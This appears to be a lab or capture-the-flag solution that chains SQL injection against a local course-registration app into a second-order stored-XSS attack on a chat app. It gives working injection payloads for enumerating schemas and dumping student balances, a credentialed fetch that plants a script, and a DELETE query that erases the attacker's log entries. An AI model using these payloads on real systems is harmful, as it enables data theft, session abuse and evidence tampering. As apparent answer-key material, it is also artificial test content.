# Solution C1

## 1. Confirm SQL injection and column count

Use Course Registration with Student ID `9900001`. Put this in the Registration PIN field:

```sql
x' OR '1'='1' -- -
```

Then find the number of returned columns:

```sql
x' ORDER BY 1 -- -
x' ORDER BY 2 -- -
x' ORDER BY 3 -- -
x' ORDER BY 4 -- -
x' ORDER BY 5 -- -
x' ORDER BY 6 -- -
```

`ORDER BY 5` should work and `ORDER BY 6` should fail, meaning the original query has five output columns.

## 2. Discover tables and columns

Table discovery:

```sql
x' UNION SELECT 1,'','',GROUP_CONCAT(table_name),0 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
```

Expected relevant output:

```text
log,registration
```

Column discovery:

```sql
x' UNION SELECT 1,'','',GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ', '),0 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='registration' -- -
```

```sql
x' UNION SELECT 1,'','',GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ', '),0 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='log' -- -
```

Expected column sets:

```text
registration: student_id, first_name, last_name, reg_pin, balance_due
log: id, submitted_id, submitted_secret, attempted_at
```

## 3. Extract all balances

Use this payload in the Registration PIN field:

```sql
x' UNION SELECT 1,'','',GROUP_CONCAT(CONCAT(student_id,' ',first_name,' ',last_name,':',FORMAT(balance_due,2)) ORDER BY student_id SEPARATOR '<br>'),0 FROM registration -- -
```

This should display all fifteen students and their balances.

## 4. Prepare the second stored-XSS message

The Chat app stores message bodies safely in the database, but it renders them without escaping. The second payload can therefore be minimal and non-replicating:

```html
<script>document.title="C1-SECOND-ORDER-XSS"</script>
```

When sent as a form-encoded POST body to `/send`, it becomes:

```text
message=%3Cscript%3Edocument.title%3D%22C1-SECOND-ORDER-XSS%22%3C%2Fscript%3E
```

This payload only changes `document.title`. It does not submit any forms, send any network requests, or create more messages.

## 5. Persist the first stored-XSS payload

Log in to the Study Group Chat as the attacker `isha.sen` using password `chat-Isha-29`. Keep that session active.

Then submit this Course Registration request:

- Student ID: `9900001`
- Registration PIN field:

```sql
reg-isha-29'; UPDATE registration SET last_name='<script>fetch("http://localhost:3001/send",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},credentials:"include",body:"message=%3Cscript%3Edocument.title%3D%22C1-SECOND-ORDER-XSS%22%3C%2Fscript%3E"});</script>' WHERE student_id=9900001; -- -
```

The first stored payload is placed in the attacker's own registration row. It will run when the Course Registration result page renders the attacker's name.

## 6. Trigger the Chat write

While still logged in to Chat as `isha.sen`, perform a normal Course Registration check:

- Student ID: `9900001`
- Registration PIN: `reg-isha-29`

The first script should submit the second script to `http://localhost:3001/send` under the attacker's Chat session.

Expected new Chat message by Isha:

```html
<script>document.title="C1-SECOND-ORDER-XSS"</script>
```

Do not manually post this message. It must be created by the stored payload from Course Registration.

## 7. Verify independent-viewer execution

Log out of Chat, then log in as the victim:

- Username: `fahim.mirza`
- Password: `chat-Fahim-29`

Simply load the Chat feed. The stored chat message should execute in the victim's browser and change the page title to:

```text
C1-SECOND-ORDER-XSS
```

No further messages should be created. Reloading may execute the same title-changing script again, but it should not replicate or change server state.

Use the Course Registration PIN field:

```sql
reg-isha-29'; DELETE FROM log WHERE submitted_id='9900001'; -- -
```

This removes only the attacker's registration submission log entries. Evidence for other submitted IDs should remain.
